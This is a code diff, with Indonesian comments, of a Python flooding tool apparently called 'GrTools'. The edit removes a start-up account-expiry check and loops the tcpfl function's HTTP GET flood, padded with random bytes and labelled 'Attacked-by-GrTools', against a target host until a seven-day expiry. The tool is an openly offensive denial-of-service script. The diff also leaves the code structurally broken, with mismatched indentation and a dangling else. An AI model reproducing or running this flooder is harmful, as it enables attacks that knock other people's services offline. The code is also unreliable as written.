@@ -8,6 +8,9 @@ import http.client
 import threading
 import os
 import time
+from colorama import Fore
+
+# Tanggal kedaluwarsa (misalnya 7 hari setelah saat ini)
 expiration_date = datetime.datetime.now() + datetime.timedelta(days=7)
 
 # Fungsi untuk memeriksa apakah akun sudah kedaluwarsa
@@ -18,13 +21,6 @@ def is_account_expired():
     else:
         return False
 
-# Memeriksa apakah akun sudah kedaluwarsa sebelum menjalankan aksi
-if is_account_expired():
-    print("Akun telah kedaluwarsa. Silakan perbarui.")
-    # Tambahkan kode untuk menampilkan pesan atau melakukan tindakan lain saat akun telah kedaluwarsa
-    exit()
-else:
-    # Lanjutkan dengan eksekusi kode yang ada
 tampilan = """
 ╔═══╦═══╗    ╔════╦═══╦═══╦╗──╔═══╗
 ║╔═╗║╔═╗║    ║╔╗╔╗║╔═╗║╔═╗║║──║╔═╗║
@@ -116,6 +112,7 @@ def cpukil():
 
 def tcpfl():
     grtools = os.urandom(15419) + random._urandom(10414)
+    while datetime.datetime.now() < expiration_date:
         get_host = "GET /Attacked-by-GrTools HTTP/1.1\r\nHost: " + ip + "\r\n"
         request  = get_host + Headers + "\r\n"
     else:
